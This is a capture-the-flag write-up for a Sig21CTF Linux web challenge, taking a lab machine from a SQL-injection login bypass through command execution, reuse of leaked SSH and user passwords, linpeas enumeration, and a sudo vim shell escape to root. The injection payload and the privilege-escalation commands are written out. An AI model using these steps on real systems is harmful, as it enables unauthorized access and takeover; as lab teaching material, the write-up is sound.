---
title: Web Linux Sig21CTF IIUM
date: 2022-01-11
categories: [sig21ctf-IIUM, Web-Linux]
tags: [sqli, priv-esc, nodejs, linux, mis-config]     # TAG names should always be lowercase
---

### Web Linux Sig21CTF

#### Flag 1.

navigating to http://sig21ctf:3000 we got this login page. From the question hint, we knew that the backend database is mysql. The first thing i think of is SQL-Injection. using this payload I was able to bypass the login `"OR 1=1--"`. Checking the http-headers we can get the flag <br>`flag1: sig21CTF{wh0_s4id_1_need_passw0rd_t0_l0g1n}`

#### Flag 2.

After a successfull login then we can see a command portal, seemingly for the admin to run some system commands,. executing `ls -lah` reveal the contents of the directory.

```bash
drwxr-xr-x  1 root root 4.0K Mar 30 11:37 .
drwxr-xr-x  1 root root 4.0K Mar 30 11:26 ..
-rw-r--r--  1 root root  612 Mar  3 15:34 dashboard.html
-rwxr-xr-x  1 root root 1.1K Mar 11 14:25 deploy.sh
-rw-r--r--  1 root root   38 Mar 30 11:35 flag2.txt
-rw-r--r--  1 root root  950 Mar  3 15:34 login.html
-rw-r--r--  1 root root 3.8K Mar 30 11:25 login.js
drwxr-xr-x 68 root root 4.0K Mar 30 11:34 node_modules
-rw-r--r--  1 root root  47K Mar  3 15:34 package-lock.json
-rw-r--r--  1 root root  359 Mar  3 15:34 package.json
drwxr-xr-x  2 root root 4.0K Mar  3 15:34 static
-rwxr-xr-x  1 root root  158 Mar 30 11:37 wrapper.sh
```

Now its clear that we need to read the file flag2.txt. I tried using `cat` but doesnt work. so i just `tac` instead <br>`flag2: sig21CTF{n0t_0nl7_c4t_c4n_v13w_f1l3s}`

#### Flag 3.

Login at http-header content from earliear, I noticed a ssh credentials `sshuser:qP9jjbYeWzf7zs9t:2222` Using them will give us ssh access to the machine
we simple got the flag at sshuser home <br>`flag3: sig21CTF{1_though7_1t_w4s_s3cur3d_t0_st0r3_th3_55h_k3y5_h3r3}`

#### Flag 4.

downloading linpeas.sh and running it we find the passwd.bak file easily <br> ![img](/assets/img/sig21ctf/linux/nodelogin/flag_4.png) <br>
So now we have another user creds
loggin as abu now we can see the flag at his homes directory
```bash
cat /opt/.passwd.bak
abu:WZd8gvSakFFUL8Me8gza
su abu && cd && cat flag_4.txt
flag4: sig21CTF{643628b8b7e514bb557211424e3796f4
```

#### Flag 5.


Running linpeas again as user abu, we figure out we actually can run /usr/bin/vim as root. <br> time to visit gtfobins  <br> ![img](/assets/img/sig21ctf/linux/nodelogin/flag_5.png) 
```bash
sudo vim -c ':!/bin/bash'
&& cd && cat flag_5.txt
flag5: sig21CTF{y0u_ju5t_g0tt4_l34rn_5tuff_0n_y0ur_0wn}
```
The above command will run vim in command mode and execute `/bin/bash`. since we run vim as root, we can still main our privileges.

#### Flag 6.

Checking the hint we can see that /etc was emphasize. So i just a simple grep command on /etc searching for anything with the flag format. and lucky enough we found something

```bash
grep -R sig21CTF{.*} /etc/ 2>/dev/null
/etc/ssh/sshd_config:# flag6: sig21CTF{52eaf68fadf470e9c993efb54a26ba35} 

```

### CONCLUTION

We started a simple sql injection and eventually we move to pwing the machine and becoming root.
We utilize various mis-configurations on our way. Enumeration is the key, without it we cant find abu's passwd nor seeing the mis-config on /usr/bin/vim . Finding that passwd was our first on becoming root.

Thanks and i hope this helps :)
